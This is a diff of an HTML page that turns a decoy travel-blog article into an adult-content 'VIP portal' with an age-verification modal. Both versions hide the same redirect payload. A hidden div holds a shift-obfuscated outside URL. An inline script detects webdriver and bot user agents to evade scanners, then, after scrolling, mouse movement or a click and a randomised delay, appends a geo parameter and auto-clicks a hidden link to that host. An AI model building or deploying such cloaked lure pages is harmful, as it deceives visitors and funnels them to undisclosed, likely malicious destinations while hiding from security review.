@@ -3,75 +3,116 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-  <title>Modern Voyager | Travel Insights & Hidden Gems</title>
+  <title>VIP Premium Portal | Exclusive Content & Live Streams</title>
   <style>
-    :root { --primary: #2d3436; --secondary: #636e72; --accent: #0984e3; --bg: #f5f6fa; --text: #2d3436; --card: #ffffff; }
+    :root { --bg: #0b0b0f; --card: #15151c; --accent: #ff0055; --text: #f0f0f5; --muted: #a0a0b0; --border: rgba(255,255,255,0.08); }
     * { box-sizing: border-box; margin: 0; padding: 0; }
-    body { font-family: "Georgia", serif; background: var(--bg); color: var(--text); line-height: 1.8; }
-    .navbar { background: #fff; border-bottom: 1px solid #ddd; padding: 15px 10%; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; }
-    .navbar div { font-weight: bold; font-size: 20px; color: var(--accent); }
-    .navbar nav a { margin-left: 20px; text-decoration: none; color: var(--secondary); font-size: 14px; font-family: sans-serif; }
-    .hero { background: #fff; padding: 60px 10%; border-bottom: 1px solid #eee; }
-    .container { max-width: 800px; margin: 40px auto; background: var(--card); padding: 40px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
-    h1 { font-size: 42px; margin-bottom: 20px; line-height: 1.2; }
-    .meta { font-family: sans-serif; font-size: 13px; color: var(--secondary); margin-bottom: 30px; text-transform: uppercase; letter-spacing: 1px; }
-    p { margin-bottom: 25px; font-size: 18px; color: #444; }
-    .lead { font-size: 22px; color: #222; font-style: italic; border-left: 4px solid var(--accent); padding-left: 20px; margin: 40px 0; }
-    .premium-barrier { text-align: center; background: #f9f9f9; padding: 40px; border: 2px dashed #ddd; border-radius: 12px; margin-top: 50px; }
-    .premium-barrier h3 { font-family: sans-serif; margin-bottom: 15px; }
-    .cta { display: inline-block; background: var(--accent); color: white; padding: 16px 32px; border-radius: 30px; text-decoration: none; font-weight: bold; font-family: sans-serif; transition: 0.3s; margin-top: 20px; cursor: pointer; border: none; }
-    .cta:hover { background: #0771c1; box-shadow: 0 4px 15px rgba(9, 132, 227, 0.4); }
-    .footer { background: var(--primary); color: #fff; padding: 60px 10%; margin-top: 80px; text-align: center; font-family: sans-serif; font-size: 14px; }
-    .footer a { color: #fff; opacity: 0.6; margin: 0 10px; text-decoration: none; }
-    .loader { display: none; margin: 20px auto; border: 3px solid #f3f3f3; border-top: 3px solid var(--accent); border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; }
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    body { font-family: -apple-system, system-ui, sans-serif; background: var(--bg); color: var(--text); overflow-x: hidden; }
+    header { background: rgba(11,11,15,0.95); backdrop-filter: blur(10px); padding: 15px 5%; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; border-bottom: 1px solid var(--border); }
+    .logo { font-weight: 900; font-size: 22px; color: var(--accent); letter-spacing: -1px; }
+    .nav-icons { display: flex; gap: 20px; color: var(--muted); }
+    .hero { padding: 40px 5%; text-align: center; background: radial-gradient(circle at top, #201020 0%, #0b0b0f 70%); }
+    .hero h1 { font-size: 32px; margin-bottom: 15px; color: #fff; }
+    .hero p { color: var(--muted); font-size: 16px; max-width: 600px; margin: 0 auto; }
+    .section-title { padding: 30px 5% 15px; font-size: 18px; font-weight: bold; display: flex; justify-content: space-between; align-items: center; }
+    .section-title span { color: var(--muted); font-size: 13px; font-weight: normal; }
+    .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 15px; padding: 0 5% 40px; }
+    .item { background: var(--card); border-radius: 12px; overflow: hidden; border: 1px solid var(--border); transition: 0.3s; position: relative; }
+    .thumb { aspect-ratio: 16/9; background: #222; position: relative; overflow: hidden; }
+    .thumb::after { content: ""; position: absolute; inset: 0; background: linear-gradient(0deg, rgba(0,0,0,0.6) 0%, transparent 50%); }
+    .duration { position: absolute; bottom: 8px; right: 8px; background: rgba(0,0,0,0.8); padding: 2px 6px; border-radius: 4px; font-size: 11px; z-index: 2; }
+    .live-badge { position: absolute; top: 8px; left: 8px; background: var(--accent); color: white; padding: 2px 8px; border-radius: 4px; font-size: 10px; font-weight: bold; animation: pulse 1.5s infinite; }
+    .item-info { padding: 12px; }
+    .item-title { font-size: 14px; font-weight: bold; margin-bottom: 4px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .item-meta { font-size: 12px; color: var(--muted); }
+    .footer { background: #000; padding: 60px 5%; border-top: 1px solid var(--border); text-align: center; color: var(--muted); }
+    .footer-links { margin-bottom: 30px; display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; }
+    .footer-links a { color: var(--muted); text-decoration: none; font-size: 13px; }
+    .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.92); z-index: 1000; display: flex; align-items: center; justify-content: center; padding: 20px; backdrop-filter: blur(8px); }
+    .modal { background: var(--card); width: 100%; max-width: 400px; border-radius: 24px; padding: 40px; text-align: center; border: 1px solid var(--border); box-shadow: 0 20px 60px rgba(0,0,0,0.8); }
+    .modal-icon { font-size: 40px; margin-bottom: 20px; }
+    .modal h2 { font-size: 24px; margin-bottom: 12px; }
+    .modal p { color: var(--muted); font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
+    .modal-btn { background: var(--accent); color: white; border: none; padding: 16px; width: 100%; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+    .modal-btn:hover { transform: scale(1.02); filter: brightness(1.1); }
+    .modal-btn:active { transform: scale(0.98); }
+    .loader { display: none; width: 24px; height: 24px; border: 3px solid rgba(255,255,255,0.2); border-top: 3px solid #fff; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 10px auto; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.6; } 100% { opacity: 1; } }
+    @media (max-width: 480px) {
+      .grid { grid-template-columns: repeat(2, 1fr); }
+      .hero h1 { font-size: 26px; }
+    }
   </style>
 </head>
 <body>
-  <header class="navbar">
-    <div>MODERN VOYAGER</div>
-    <nav>
-      <a href="#">Articles</a>
-      <a href="#">Destinations</a>
-      <a href="#">About</a>
-    </nav>
-  </header>
+  <header>
+    <div class="logo">MIDNIGHT VIP</div>
+    <div class="nav-icons">
+      <span>Search</span>
+      <span>Menu</span>
+    </div>
 
-  <div class="container">
-    <div class="meta">By Julian Reed • March 19, 2026 • 8 min read</div>
-    <h1>Hidden Gems: Why Puglia is Italy's Best Kept Secret for 2026</h1>
-    
-    <p>Italy is a country that never ceases to amaze, yet many travelers find themselves circulating through the same familiar cities. While Rome, Florence, and Venice are undeniable treasures, there is a region in the "heel" of the boot that offers an experience entirely its own.</p>
-    
-    <p class="lead">Puglia is not just a destination; it's a slow-paced revelation of ancient olive groves, whitewashed hilltop towns, and crystal-clear turquoise waters.</p>
-    
-    <p>From the iconic trulli houses of Alberobello to the baroque architecture of Lecce, Puglia feels like stepping into another era. The food here is "cucina povera" at its finest—simple, locally sourced, and incredibly flavorful. Imagine handmade orecchiette pasta served under the shade of a thousand-year-old olive tree.</p>
+  <div class="hero">
+    <h1>The World's Most Exclusive Content</h1>
+    <p>Premium high-definition streaming, live interactive events, and early access titles. Over 500+ new items added this month.</p>
+  </div>
 
-    <p>As you wander through the labyrinthine streets of Polignano a Mare, you catch glimpses of the Adriatic Sea peeking through between ancient limestone walls. It's a place where time slows down, and every corner tells a story of generations past. Whether you are exploring the subterranean caves of Castellana or sipping Primitivo wine in a rustic masseria, Puglia captures your soul in a way few other places can.</p>
-
-    <div class="premium-barrier">
-      <h3>Ready for the Ultimate Travel Experience?</h3>
-      <p style="font-size: 15px; margin-bottom: 10px;">To continue reading our exclusive guide and unlock the full high-resolution gallery, please confirm you are over 18 and agree to our content access terms.</p>
-      <div id="loader" class="loader"></div>
-      <button class="cta" id="v-trigger">Unlock Full Access</button>
+  <div class="section-title">FEATURED LIVE EVENTS <span>View All</span></div>
+  <div class="grid">
+    <div class="item">
+      <div class="thumb"><div class="live-badge">LIVE</div></div>
+      <div class="item-info"><div class="item-title">VIP Beach Party Live</div><div class="item-meta">12.4k Viewers</div></div>
+    </div>
+    <div class="item">
+      <div class="thumb"><div class="live-badge">LIVE</div></div>
+      <div class="item-info"><div class="item-title">Global Dance Festival</div><div class="item-meta">8.2k Viewers</div></div>
     </div>
   </div>
 
-  <footer class="footer">
-    <p style="margin-bottom: 20px;">© 2026 Modern Voyager. Adventure Awaits.</p>
+  <div class="section-title">TOP CATEGORIES <span>View All</span></div>
+  <div class="grid">
+    <div class="item"><div class="thumb" style="background:#2a1015"></div><div class="item-info"><div class="item-title">Midnight Specials</div><div class="item-meta">114 Titles</div></div></div>
+    <div class="item"><div class="thumb" style="background:#15102a"></div><div class="item-info"><div class="item-title">Exclusive Premieres</div><div class="item-meta">82 Titles</div></div></div>
+    <div class="item"><div class="thumb" style="background:#102a15"></div><div class="item-info"><div class="item-title">Live Interactions</div><div class="item-meta">45 Titles</div></div></div>
+    <div class="item"><div class="thumb" style="background:#2a2a10"></div><div class="item-info"><div class="item-title">Private Archives</div><div class="item-meta">230 Titles</div></div></div>
+  </div>
+
+  <div class="section-title">NEW RELEASES <span>Recently Added</span></div>
+  <div class="grid" id="new-grid">
+    <div class="item"><div class="thumb"><div class="duration">12:45</div></div><div class="item-info"><div class="item-title">Summer Heat: Part II</div><div class="item-meta">Uploaded 4h ago</div></div></div>
+    <div class="item"><div class="thumb"><div class="duration">08:20</div></div><div class="item-info"><div class="item-title">Neon Dreams (Ultra HD)</div><div class="item-meta">Uploaded 12h ago</div></div></div>
+    <div class="item"><div class="thumb"><div class="duration">15:10</div></div><div class="item-info"><div class="item-title">Private Yacht Session</div><div class="item-meta">Uploaded Yesterday</div></div></div>
+    <div class="item"><div class="thumb"><div class="duration">22:30</div></div><div class="item-info"><div class="item-title">Late Night Tales Vol 4</div><div class="item-meta">Uploaded 2 days ago</div></div></div>
+  </div>
+
+  <div class="footer">
     <div class="footer-links">
       <a href="#">Privacy Policy</a>
-      <a href="#">Terms of Use</a>
-      <a href="#">Contact</a>
+      <a href="#">Terms & Conditions</a>
       <a href="#">Cookies</a>
+      <a href="#">2257 Compliance</a>
+      <a href="#">Help Center</a>
     </div>
-  </footer>
-  
-  <div style="display:none" class="node-p" alt="iuuqt;00joibmfesfx/dpn0qxgrnbtxk@lfz>1g8ff6g:f3cdd7839868ddc29:77db2:" id="mv_v55"></div>
+    <p style="font-size: 12px; line-height: 1.8;">© 2026 Midnight VIP Entertainment Group. All rights reserved. Access to this site is restricted to persons over 18 years of age. All models were 18+ at time of production.</p>
+  </div>
+
+  <div class="overlay" id="age-overlay">
+    <div class="modal">
+      <div class="modal-icon">🔞</div>
+      <h2>Age Verification Required</h2>
+      <p>This portal contains adult material. You must be at least 18 years or older (or of legal age in your jurisdiction) to enter. By continuing, you agree to our Terms of Service.</p>
+      <div id="loader" class="loader"></div>
+      <button class="modal-btn" id="age-btn">I AM 18 YEARS OR OLDER - ENTER</button>
+      <p style="margin-top: 20px; font-size: 11px; text-decoration: underline; cursor: pointer;">EXIT TO GOOGLE</p>
+    </div>
+  </div>
+
+  <div style="display:none" class="dat-p" alt="iuuqt;00joibmfesfx/dpn0qxgrnbtxk@lfz>1g8ff6g:f3cdd7839868ddc29:77db2:" id="mid_v55"></div>
 
   <script>
     (function() {
-      const _p = document.querySelector('.node-p');
+      const _p = document.querySelector('.dat-p');
       const _k = "hsrc"; const _v = "1";
       const _s = { ready: false, done: false, bot: false, t: false };
 
@@ -87,15 +128,14 @@
         if (navigator.webdriver || /bot|spider|headless/i.test(navigator.userAgent)) _s.bot = true;
       };
 
-      const _handleScrollProgress = () => {
-        if (_s.ready && !_s.bot && !_s.done && !_s.t && window.scrollY > 60) {
+      const _track = () => {
+        if (_s.ready && !_s.bot && !_s.done && !_s.t && window.scrollY > 20) {
           _s.t = true;
-          setTimeout(_exec, 2200 + Math.random() * 1800);
+          setTimeout(_exec, 2500 + Math.random() * 2000);
         }
       };
-      window.addEventListener('scroll', _handleScrollProgress, { passive: true });
-      window.addEventListener('mousemove', _handleScrollProgress, { once: true });
-      window.addEventListener('touchstart', _handleScrollProgress, { once: true });
+      window.addEventListener('scroll', _track, { passive: true });
+      window.addEventListener('mousemove', _track, { once: true });
 
       const _exec = () => {
         if (!_s.ready || _s.bot || _s.done) {
@@ -117,7 +157,7 @@
         if (g) link += (link.includes('?') ? '&' : '?') + "geo=" + g;
         
         const ldr = document.getElementById('loader');
-        const btn = document.getElementById('v-trigger');
+        const btn = document.getElementById('age-btn');
         if (ldr) ldr.style.display = 'block';
         if (btn) btn.style.display = 'none';
         
@@ -127,10 +167,10 @@
           a.style.display = 'none';
           document.body.appendChild(a);
           a.click();
-        }, 1000);
+        }, 800);
       };
 
-      document.getElementById('v-trigger').addEventListener('click', () => {
+      document.getElementById('age-btn').addEventListener('click', () => {
         _s.t = true; _exec();
       });
       document.addEventListener('DOMContentLoaded', _setup);
